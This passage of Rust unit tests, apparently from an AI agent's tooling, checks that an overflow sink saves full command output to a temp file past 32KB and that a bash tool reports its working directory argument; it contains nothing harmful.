        tail.push_bytes(&chunk);
        sink.write(&tail, &chunk);
        sink.finish();
        assert!(sink.path().is_none(), "should not open a file under 32KB");
    }

    #[test]
    fn overflow_sink_writes_full_content_over_threshold() {
        let dir = tempfile::tempdir().unwrap();
        let mut tail = RollingTailBuffer::new(32 * 1024);
        let mut sink = OverflowSink::new(Some(dir.path().to_path_buf()));
        let c1 = vec![b'a'; 30 * 1024];
        let c2 = vec![b'b'; 15 * 1024];
        tail.push_bytes(&c1); sink.write(&tail, &c1);
        tail.push_bytes(&c2); sink.write(&tail, &c2);
        sink.finish();
        let path = sink.path().expect("file should exist over 32KB").to_path_buf();
        let written = std::fs::read(&path).unwrap();
        assert_eq!(written.len(), 45 * 1024, "temp file must hold the FULL output, not the 32KB tail");
        assert_eq!(&written[..30 * 1024], &c1[..]);
        assert_eq!(&written[30 * 1024..], &c2[..]);
    }
}

#[cfg(test)]
mod path_args_tests {
    use super::*;
    use crate::agent::tools::tool::Tool;

    #[test]
    fn bash_path_args_returns_working_dir_when_present() {
        let tool = BashTool::new(PathBuf::from("/tmp"));
        let args = serde_json::json!({"command": "ls", "working_dir": "/var/log"});
        assert_eq!(tool.path_args(&args), vec!["/var/log"]);
    }

    #[test]
    fn bash_path_args_empty_when_no_working_dir() {
        let tool = BashTool::new(PathBuf::from("/tmp"));
        let args = serde_json::json!({"command": "ls"});
        assert!(tool.path_args(&args).is_empty());
    }
}
